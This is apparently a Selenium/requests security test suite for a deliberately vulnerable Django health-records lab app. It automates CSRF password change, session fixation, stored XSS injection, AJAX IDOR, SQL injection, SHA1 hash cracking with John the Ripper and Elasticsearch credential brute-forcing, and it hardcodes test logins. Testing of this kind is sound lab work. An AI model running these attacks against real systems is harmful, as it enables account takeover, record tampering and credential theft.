    # -*- coding: utf-8 -*-

# from pyvirtualdisplay import Display
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import NoAlertPresentException
import unittest, time, re
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from time import sleep
from datetime import datetime as dtdatetime
import datetime
from django.test import LiveServerTestCase
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
from chart_report import *
from reportlab.platypus import SimpleDocTemplate,Image,PageBreak

from selenium.common.exceptions import UnexpectedAlertPresentException
from jinja2 import Environment, FileSystemLoader
from selenium.webdriver.support.ui import Select
import unittest
import requests
import json
import time
import re
import hashlib
import sys
import subprocess
from termcolor import *
import urllib2
from BeautifulSoup import BeautifulSoup
from requests.auth import HTTPBasicAuth
from datetime import datetime
from results import log_results,log_exceptions,delete_index,display_results

from colorama import *
init(autoreset=True)


SCREEN_DUMP_LOCATION = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'screendumps')

# host = "localhost"
host  = "localhost:8000"


class CTF(LiveServerTestCase):
    def setUp(self):
        # display = Display(visible=0, size=(800, 600))
        # display.start()
        self.driver = webdriver.Firefox()
        self.driver.maximize_window()
        self.driver.implicitly_wait(30)
        self.base_url = "http://" + host
        self.verificationErrors = []
        self.accept_next_alert = True
        self.username = 'bruce.banner@we45.com'
        self.password  = 'secdevops'
        self.errors_and_failures = self.tally()
        super(CTF, self).setUp()

    def request_login(self, email, psswd):
        login_url = self.base_url + '/login/'
        login = requests.session()
        login.get(login_url)
        csrf_token = login.cookies['java_csrf']
        login_data = dict(email_id=email,password=psswd,csrfmiddlewaretoken=csrf_token)
        r = login.post(login_url, data=login_data, headers=dict(Referer=login_url))
        return [r,login]

    def request_reset(self):
        r,login = self.request_login("jessica.alba@we45.com","secdevops")
        if '/dashboard/' not in r.url:
            r,login= self.request_login("jessica.alba@we45.com","123456")
            csrf_token = login.cookies['java_csrf']
            change_passwd_url = self.base_url + "/password_change/"
            change_passwd = login.get(change_passwd_url)
            change_passwd_data = dict(new_password1="secdevops",new_password2="secdevops",csrfmiddlewaretoken=csrf_token)
            r = login.post(change_passwd_url, data=change_passwd_data, headers=dict(Referer=change_passwd_url))
        

    def authenticate(self, username=None, password=None):
        driver = self.driver
        driver.get(self.base_url + '/login/')
        time.sleep(1)
        if username and password:
            email = username
            data = {'username':username,'password':password}
        else:
            email = self.username
            data = {'username':self.username,'password':self.password}
        form = driver.find_element_by_tag_name('form')
        for k,v in data.items():
            elem = form.find_element_by_id("%s"%k) 
            elem.clear()
            elem.send_keys(v)
        form.find_element_by_id('submit').click() 
        print ('\033[32m' + "[+] Logged into application as %s"%email)
        time.sleep(1)

    def test_csrf(self):
        delete_index()
        self.request_reset()

        driver = self.driver
        driver.get(self.base_url + "/")
        timestamp = dtdatetime.now().isoformat().replace(':', '.')[:19]
        pdf_path = os.path.join('Reports','CSRF-Report.pdf')
        doc=SimpleDocTemplate(pdf_path,pageSize=A4,leftMargin=72,rightMargin=10)
        attack = "CSRF Attack"
        doc.header = "Chart Report For %s"%attack
        doc.title = "Chart Report For %s"%attack

        email_id = "jessica.alba@we45.com"
        self.authenticate(email_id, "secdevops")

        elements = []
        elements.append(PageBreak())

        # email_id = self.username

        # driver.find_element_by_link_text(email_id).click()
        # driver.find_element_by_link_text("Change Password").click()

        pwd_change_url = self.base_url + "/password_change/"
        change_pwd = "123456"

        j2_env = Environment(loader=FileSystemLoader(os.getcwd()), trim_blocks=True)
        file_data = j2_env.get_template('cs_template.html').render(host=pwd_change_url, pwd=change_pwd)
        print colored("[+] Creating CSRF Exploit HTMl", 'green')

        f = open("cs.html", 'w')
        f.write(file_data)
        f.close()

        time.sleep(5)
        mainwindow = driver.find_element_by_tag_name("body")
        mainwindow.send_keys(Keys.CONTROL + 't')
        filepath = "file://"+ os.getcwd() +"/cs.html"
        driver.get(filepath)
        time.sleep(5)

        tamepered_filename = "Tampered-request-page.png"
        image_path = os.path.join('Screenshots','%s'%tamepered_filename)
        image_path = os.path.join(os.getcwd(),image_path)
        self.driver.save_screenshot(image_path)

        title=createTitleLegend('Tamepered Request Page')
        elements.append(title)
        elements.append(Image(image_path,width=6*inch,height=6*inch,kind='proportional'))
        elements.append(PageBreak())

        driver.find_element_by_xpath("html/body/form/input[3]").click()

        newtab = driver.find_element_by_tag_name("body")
        newtab.send_keys(Keys.CONTROL + 'w')
        time.sleep(2)
        driver.find_element_by_link_text(email_id).click()
        driver.find_element_by_link_text("Log Out").click()
        time.sleep(2)

        self.authenticate(email_id, "cwasp")

        self.authenticate(email_id, change_pwd)
        # print driver.current_url
        # print self.base_url
        if driver.current_url == self.base_url+"/dashboard/":
            log_results('test_csrf','%s/dashboard/'%self.base_url,'csrf','CSRF Attack','Failure')
            print '[+] Test success'
        else:
            log_results('test_csrf','%s/dashboard/'%self.base_url,'csrf','CSRF Attack','Success')
            print '[+] Test fails'

        try:
            admin_page = driver.find_element_by_link_text(email_id)
            if admin_page:
                print colored("[+] CSRF Exploited :)", 'red')
                time.sleep(2)
                tamepered_filename = "Exploited-result.png"
                exploited_image = os.path.join('Screenshots','%s'%tamepered_filename)
                exploited_image = "%s/%s"%(os.getcwd(),exploited_image)
                exploited_image = os.path.join(os.getcwd(),exploited_image)

                self.driver.save_screenshot(exploited_image)

                title=createTitleLegend('Expoited Result after Tampered Result')
                elements.append(title)
                elements.append(Image(exploited_image,width=6*inch,height=6*inch,kind='proportional'))
                doc.build(elements,onFirstPage=createCoverPage,onLaterPages=createHeaderFooter)
                driver.find_element_by_link_text(email_id).click()
                driver.find_element_by_link_text("Log Out").click()
                driver.close()

        except NoSuchElementException as e:
            print "[+] CSRF Not Exploited"
            print colored("[+] Could Not Exploit CSRF :(", 'red')
            driver.close()
       
        display_results()
    def test_session_fixation(self):
        delete_index()
        driver = self.driver
        driver.get(self.base_url + "/")

        elements=[]
        elements.append(PageBreak())
        pdf_path = os.path.join('Reports','Session-Fixation-Report.pdf')
        doc=SimpleDocTemplate(pdf_path,pageSize=A4,leftMargin=72,rightMargin=10)
        attack = "Session Fixation"
        doc.header = "Chart Report For %s"%attack
        doc.title = "Chart Report For %s"%attack

        email_id = self.username

        self.authenticate()

        homepage_url = driver.current_url

        print colored("[+] URL After Login: ",'magenta'), homepage_url
        # print os.getcwd()
        time.sleep(2)

        tamepered_filename = "SessionFixation1.png"
        image_path = os.path.join('Screenshots','%s'%tamepered_filename)
        image_path = os.path.join(os.getcwd(),image_path)

        driver.save_screenshot(image_path)

        title=createTitleLegend('Before Session Fixation')
        elements.append(title)
        elements.append(Image(image_path,width=6*inch,height=6*inch,kind='proportional'))
        elements.append(PageBreak())

        initial_cookie = driver.get_cookies()
        # print colored("Initial Session id-->", 'green'),initial_cookie[0]['value']

        # print initial_cookie
        for b in initial_cookie:
            if b.get('name') == "sessionid":
                initial_session_id = b.get('value')
                print colored("[+] After Login, Session id:", 'green'), initial_session_id

        driver.find_element_by_link_text(email_id).click()
        driver.find_element_by_link_text("Log Out").click()

        print colored("[+] Logged out of Application",'magenta')

        logged_out_cookie = driver.get_cookies()

        print colored("[+] Session id after log out-->",'green'),logged_out_cookie[0]['value']

        driver.delete_all_cookies()
        time.sleep(2)

        print colored("[+] Deleted previous cookies  -->",'blue'),driver.get_cookies()

        tamepered_filename = "SessionFixation2.png"
        exploited_image1 = os.path.join('Screenshots','%s'%tamepered_filename)
        exploited_image1 = os.path.join(os.getcwd(),exploited_image1)
    
        self.driver.save_screenshot(exploited_image1)

        title=createTitleLegend('Logged Out of the Application')
        elements.append(title)
        elements.append(Image(exploited_image1,width=6*inch,height=6*inch,kind='proportional'))

        new_cookie = {'name' : 'sessionid', 'value' : initial_session_id}
        # new_cookie1 = {'name' : 'pwd', 'value' : initial_session_id1} 

        driver.add_cookie(new_cookie)

        print colored("[+] Uploading previous session id", 'green')
        # driver.add_cookie(new_cookie1)

        current_cookie = driver.get_cookies()
        print colored("[+] Current session id (After Uploading) -->",'green'), current_cookie[0]['value']
        load_url = '%s/dashboard/'%self.base_url
        driver.get(load_url) 
        time.sleep(10)
        if load_url == driver.current_url and current_cookie[0].get('value')== initial_cookie[0].get('value'):
            log_results('test_session_fixation','%s/dashboard/'%self.base_url,'sessionid','Session Fixation','Failure')
            print '[+] Test success'
        else:
            log_results('test_session_fixation','%s/dashboard/'%self.base_url,'sessionid','Session Fixation','Success')
            print '[+] Test failure'

        # print driver.current_url
        driver.get(homepage_url)

        print colored("[+] Accessing url that requires login with previous session id -->",'green'),driver.current_url

        try:
            admin_page = driver.find_element_by_link_text(email_id)
            if admin_page:
                # print admin_page
                print colored("[+] Session Fixation Exploited :)", 'red')
                allCookies3 = driver.get_cookies()
                for c in allCookies3:
                    session_id3 = c.get('value')
                    print colored("[+] After Fixation, Session id:", 'red'), session_id3
                time.sleep(2)

                tamepered_filename = "SessionFixation3.png"
                exploited_image2 = os.path.join('Screenshots','%s'%tamepered_filename)
                exploited_image2 = os.path.join(os.getcwd(),exploited_image2)
            
                self.driver.save_screenshot(exploited_image2)

                title=createTitleLegend('Expoited Result after Session Fixation')
                elements.append(title)
                elements.append(Image(exploited_image2,width=6*inch,height=6*inch,kind='proportional'))
            else:
                print "[+] Page not found"
                print colored("[+] Session was not exploited :(", 'green')

        except NoSuchElementException as e:
            print colored("[+] Element Not found, No Session Fixation", 'green')
            driver.close()            

        driver.find_element_by_link_text(email_id).click()
        driver.find_element_by_link_text("Log Out").click()
        driver.close()
        print colored("[+] Completed tests. Genereating Report............", 'blue')
        doc.build(elements,onFirstPage=createCoverPage,onLaterPages=createHeaderFooter)
        print colored("[+] End of Session Fixation Test", 'blue')
        display_results()
    def test_xss(self):
        self.authenticate()
        self.xss_request()

    def test_sha1(self):
        driver = self.driver
        try:
            driver.get(self.base_url + '/')
            driver.get(self.base_url + "/appointment/add/")            
            form = driver.find_element_by_tag_name('form') 
            date = datetime.today().strftime("%Y-%m-%d")   
            form_data = {
                'input':{
                    'name':'Test',
                    'email':'test@test.com',
                    'phone':'999999',  
                    'reason':'Test',
                    'address':'Test'                
                },
                'select':{
                    'gender':'Male',
                    'plan_type':'ConsultantAppointment',
                    'doctor':'Bruce Banner'
                },
                'date':{
                    'dob':'04/09/1991',
                    'datetime':'%s'%date
                }
            }    
            for k,v in form_data.items():
                if k == 'input':
                    for k1,v1 in v.items():
                        elem = form.find_element_by_id("id_%s"%k1)
                        elem.clear()
                        elem.send_keys(v1)
                elif k == 'select':
                    for k1,v1 in v.items():
                        Select(form.find_element_by_id("id_%s"%k1)).select_by_visible_text(v1)
                elif k == 'date':
                    for k1,v1 in v.items():
                        elem = form.find_element_by_id("id_%s"%k1)
                        elem.click()
                        elem.send_keys(v1)            
            # form.find_element_by_xpath("//input[@value='Submit']").click()
            # time.sleep(2)            
            # shadata = driver.find_element_by_xpath("//div[@class='container']/input[@name='token']").get_attribute('value').encode('utf-8')
            # data = shadata.split('$')
            # hashedstring = data[2]
            # print colored ("Identified a hashed string", 'green'), colored (hashedstring , 'magenta')
            # print "\n"
            # time.sleep(2)            
            # with open('password.txt') as dictonarylist:
            #     listdata = dictonarylist.readlines()
            #     print colored ("Initializing bruteforce...", 'blue')
            #     print "\n"
            #     for lines in listdata:
            #         hash_object = hashlib.sha1(lines.rstrip())
            #         hex_dig = hash_object.hexdigest()                    
            #         if hex_dig == hashedstring:
            #             print colored ("The hash is Broken !", 'red'), colored(lines, 'green')
            #             break
            #         else:
            #             print colored ("Bruteforcing with ",'green'), colored(lines, 'cyan')
            # time.sleep(2)
            form.find_element_by_xpath("//input[@value='Submit']").click()
            time.sleep(2)            
            shadata = driver.find_element_by_xpath("//div[@class='container']/input[@name='token']").get_attribute('value').encode('utf-8')
            data = shadata.split('$')
            hashedstring = data[2]
            print colored ("[+] Identified a hashed string", 'green'), colored (hashedstring , 'magenta')
            print "\n"
            time.sleep(2)            
            hashfile = open('hashes.txt', 'w').close()
            hashfile = open('hashes.txt', 'a')
            hashfile.write(hashedstring+'\n')
            hashfile.close()
            fpath = os.path.abspath('hashes.txt')
            john = "/home/secdevops/labs/john-1.7.9-jumbo-7/run/john"
            subprocess.call([john,'--format=raw-sha1', fpath])
            subprocess.call([john, '--format=raw-sha1', fpath, '--show'])
            time.sleep(2)            
        except BaseException, e:
            exc_type, exc_value, exc_traceback = sys.exc_info()
            print "[+] Line no :%s Exception %s"%(exc_traceback.tb_lineno,e)
        finally:
            driver.close()        

    def test_elastisearch(self):
        #driver = self.driver
        elastic_search_port = '9200'
        url = self.base_url
        elastic_search_url = "%s:%s"%(url,elastic_search_port)
        #driver.get(elastic_search_url)
        page = urllib2.urlopen(self.base_url + "/")
        soup = BeautifulSoup(page)
        
        payload = open('credentials_payloads.txt', 'w')
        for incident in soup('p'):
            for content in incident.contents:
                each_word = content.split()
                for word in each_word:
                    # print word.encode('utf-8')
                    payload.write(str(word.encode('utf-8'))+"\n")
        payload.close()
                    
        status = False
        filepath = os.path.join(os.getcwd(),'credentials_payloads.txt')
        with open(filepath) as f:
            content_1 = content_2 = f.readlines()
            for lines1 in content_1:
                user_payload = lines1.rstrip()
                for lines2 in content_2:                
                    password_payload = lines2.rstrip()          
                    r = requests.get(elastic_search_url,auth=HTTPBasicAuth(user_payload,password_payload))
                    code1 = r.status_code           
                    if code1 == 200:
                        status = True
                        # print colored ("Testing for : ", 'red'), colored (user_payload , 'red'),colored(":", 'red'),colored (password_payload, 'red')
                        # print colored("Response: \n",'blue'),r.content
                        print colored ("[+] Testing with credential : ", 'red'), colored (user_payload , 'red'),colored(":", 'red'),colored (password_payload, 'red')
                        print colored("[+] Response: \n",'blue'),r.content              
                        break
                    elif code1 == 401:
                        # print colored ("Testing for : ", 'green'), colored (user_payload , 'green'),colored(":", 'green'),colored (password_payload, 'green')
                        print colored ("[+] Testing with credential : ", 'green'), colored (user_payload , 'green'),colored(":", 'green'),colored (password_payload, 'green')
                if status:
                    break            

    def test_ajax(self):
        delete_index()
        driver = self.driver
        driver.get(self.base_url + "/")

        email_id = self.username

        self.authenticate('betty.ross@we45.com','secdevops')

        # driver.find_element_by_xpath("//div[@id='sidebar-menu']/div/ul/li[6]/a/span").click()
        # driver.find_element_by_link_text("Health Records").click()
        driver.get(self.base_url + '/records/')

        login_cookie = driver.get_cookies()

        csrf_token = ''
        for b in login_cookie:
            if b.get('name') == "java_csrf":
                csrf_token = b.get('value')

        print colored("[+] Harvesting CSRF token for AJAX request","blue")

        # print "CSRF",csrf_token
        # driver.execute_script("$(document).ready(function() {$.ajax({type: 'POST',url: /update/record/',data: {rid: 1,remarks :'AIDS',csrfmiddlewaretoken: '%s',},success: function(data) {alert(data);error: function(xhr, textStatus, errorThrown) {alert('something went wrong');alert(errorThrown)}});});"%csrf_token)
        print colored("[+] Executing AJAX request to update patient record.......","blue")
        driver.execute_script("$.ajax({type: 'POST',url: '/update/record/',data: {rid: 4,remarks : 'Normal Sugar Test',csrfmiddlewaretoken: '%s',},success: function(data) {alert('Success');},error: function(xhr, textStatus, errorThrown) {alert('something went wrong');}});"%csrf_token)
        print colored("[+] Updated steve.jobs@we45.com's patient record", "red")

        if self.is_alert_present():
            alert = driver.switch_to_alert()
            time.sleep(3)
            if str(alert.text) == "Success":  
                log_results('test_ajax','%s/update/record/'%self.base_url,'rid','AJAX IDOR','Failure')
                print '[+] Test success'
            else:
                log_results('test_ajax','%s/update/record/'%self.base_url,'rid','AJAX IDOR','Success')
                print '[+] Test fails'
            alert.accept()

        driver.get(self.base_url + "/logout")

        self.authenticate('steve.jobs@we45.com','secdevops')
        
        # driver.find_element_by_xpath("//div[@id='sidebar-menu']/div/ul/li[6]/a/span").click()
        # driver.find_element_by_link_text("Health Records").click()
        driver.get(self.base_url + '/records/')

        time.sleep(3)

        print colored("[+] IDOR using AJAX is exploited :)","red")

        driver.close()  
        display_results()      

    def test_sql_injection(self):
        # self.authenticate('betty.ross@we45.com','secdevops')       
        # with open('SQL_payload.txt') as f:
        #     for payload in f.readlines():
        #         print "payload-->",payload
        #         self.load_page(payload)
        delete_index()
        sql_session = requests.Session()
        login_url = self.base_url + "/login/"
        get_login_page = sql_session.get(login_url)
        csrf_token = sql_session.cookies['java_csrf']

        login_data = dict(email_id=self.username,password=self.password,csrfmiddlewaretoken=csrf_token)
        login_request = sql_session.post(login_url, data=login_data, headers=dict(Referer=login_url))
        post_login_token = sql_session.cookies['java_csrf']
        test_url = '%s%s/' % (self.base_url, '/tests')

        with open('SQL_payload.txt') as f:
            for payload in f.readlines():
                sqli_request = sql_session.post(test_url, data = dict(search = payload.rstrip(), csrfmiddlewaretoken=post_login_token), headers=dict(Referer=test_url))                
                soup = BeautifulSoup(sqli_request.text)
                print '[+] Payload ---> %s ==> %s'%(payload,soup('td')[1].text)
                status = True
        if status:
            log_results('test_sql_injection','%s/tests/'%self.base_url,'search','SQL Injection','Failure')
            print '[+] Test success'
        else:
            log_results('test_sql_injection','%s/tests/'%self.base_url,'search','SQL Injection','Success')
            print '[+] Test failure'   
        display_results()        

    def load_page(self,payload):
        driver = self.driver
        driver.get(self.base_url + "/tests/")
        form = driver.find_element_by_tag_name('form')
        inp = form.find_element_by_xpath('//div/input[@name="search"]')
        look = form.find_element_by_xpath('//div/input[@name="look"]')
        inp.clear()
        time.sleep(1)
        inp.send_keys(payload)
        driver.implicitly_wait(2)
        look.submit()
        time.sleep(5)        

    def load_patient_url(self):
        try:
            # self.driver.get('http://%s/patients/'%host)
            self.driver.get(self.base_url + '/patients/')
        except UnexpectedAlertPresentException:
            if self.is_alert_present:
                alert = self.driver.switch_to_alert()
                time.sleep(3)
                print colored("[+] XSS Attack exploited :)", "red")
                try:
                    alert.accept()
                except NoAlertPresentException:
                    pass
            else:
                print colored("[+] XSS Not Exploited :)", "red")

    def xss_request(self):  
        delete_index()
        self.load_patient_url() 
        host_url = self.base_url + '/api/CTF/patient/'  

        print colored("[+] Accessing URL ---->", 'blue'),colored(host_url,"magenta")
        # r = requests.get(host_url,auth=(self.username,self.password))   
        r = requests.get(host_url,auth=('bruce.banner@we45.com','secdevops'))   
        if int(r.status_code) == 200:
            json_str = json.dumps(r.json())
            object_list = json.loads(json_str).get('objects') 
            # print object_list      
            if object_list:
                data = object_list[0]
                actual_data = data              
                data['name'] = '<script>alert("XSS Attack!!!")</script>'
                pk = data['id']
                host_url = self.base_url + '/api/CTF/patient/%s/'%pk
                r = requests.put(host_url,auth=HTTPBasicAuth('bruce.banner@we45.com','cwasp'),data=json.dumps(data))
                print colored("[+] Updated %s with <script>alert('XSS Attack!!!'')</script>"%host_url, 'green')
                self.load_patient_url()
                r = requests.put(host_url,auth=HTTPBasicAuth('bruce.banner@we45.com','cwasp'),data=json.dumps(actual_data))
                # self.load_patient_url()
        else:
            print '[+] ' + r.status_code,r.content
        log_results('test_xss','%s/patients/'%self.base_url,'name','XSS Attack','Failure')
        self.load_patient_url()
        time.sleep(10)
        display_results()

    # def test_encryption(self):
    #     try:
    #         message = raw_input('Enter string ')    
    #         t = TestEncyption()
    #         t.modes(message,mode='CBC')
    #         t.modes(message,mode='ECB')
    #         t.modes(message,mode='CFB')
    #     except ValueError as e:
    #         print 'Invalid Input'
    #     except Exception as e:
    #         print 'Exception : %s'%e


    def is_element_present(self, how, what):
        try: self.driver.find_element(by=how, value=what)
        except NoSuchElementException as e: return False
        return True
    
    def is_alert_present(self):
        try: self.driver.switch_to_alert()
        except NoAlertPresentException as e: return False
        return True
    
    def close_alert_and_get_its_text(self):
        try:
            alert = self.driver.switch_to_alert()
            alert_text = alert.text
            if self.accept_next_alert:
                alert.accept()
            else:
                alert.dismiss()
            return alert_text
        finally: self.accept_next_alert = True

    def tearDown(self):
        self.assertEqual([], self.verificationErrors)
        if self._test_has_failed():
            if not os.path.exists(SCREEN_DUMP_LOCATION):
                os.makedirs(SCREEN_DUMP_LOCATION)
            for ix, handle in enumerate(self.driver.window_handles):
                self._windowid = ix
                self.driver.switch_to_window(handle)
                self.take_screenshot()
                self.dump_html()
        self.driver.quit()
        super(CTF, self).tearDown()

    def take_screenshot(self):
        filename = self._get_filename() + '.png'
        print '[+] screenshotting to', filename
        self.driver.get_screenshot_as_file(filename)


    def dump_html(self):
        filename = self._get_filename() + '.html'
        print '[+] dumping page HTML to', filename
        with open(filename, 'w') as f:
            f.write(self.driver.page_source.encode('utf-8'))

    def _get_filename(self):
        timestamp = dtdatetime.now().isoformat().replace(':', '.')[:19]
        return '{folder}/{classname}.{method}-window{windowid}-{timestamp}'.format(
            folder=SCREEN_DUMP_LOCATION,
            classname=self.__class__.__name__,
            method=self._testMethodName,
            windowid=self._windowid,
            timestamp=timestamp
        )

    def tally(self):
        return len(self._resultForDoCleanups.errors) + len(self._resultForDoCleanups.failures)                            

    def _test_has_failed(self):
        if self.tally() > self.errors_and_failures:
            return True
        return False

  

if __name__ == "__main__":
    unittest.main()
